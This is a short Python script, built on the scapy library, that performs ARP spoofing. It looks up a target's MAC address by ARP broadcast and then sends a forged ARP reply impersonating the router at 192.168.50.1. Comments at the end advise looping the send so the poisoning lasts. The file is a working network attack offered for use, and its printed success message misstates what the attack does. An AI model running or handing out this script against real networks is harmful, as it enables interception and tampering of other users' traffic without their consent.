from scapy.all import *
from scapy.layers.l2 import Ether, ARP

broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
target_ip = str(input('Enter Target IP: '))
arp_layer = ARP(pdst=target_ip)

entire_packet = broadcast/arp_layer

answer = srp(entire_packet, timeout=2,  verbose=True)[0]
# print(answer)  # prints basic results on type of packet
# print('|')
# print(answer[0])  # prints detailed results on packets
# print('|')
# print(answer[0][1].show)  # shows results on destination(attacker) and source(target) MAC address
# print('|')

target_mac_address = answer[0][1].hwsrc  # gets target mac address
print('Target MAC/Physical Address: ' + target_mac_address)
packet = ARP(op=2, hwdst=target_mac_address, pdst=target_ip, psrc='192.168.50.1')
packet.show()

send(packet, verbose=False)
print("Successfully Spoofed. Now you have the same MAC address as the target's IP!")

# This sends the packet to make sure your target's router MAC Address is the same as yours.
# However, this will not last as the target resets its IP.
# In order for it to last, you need to keep in a while or for loop
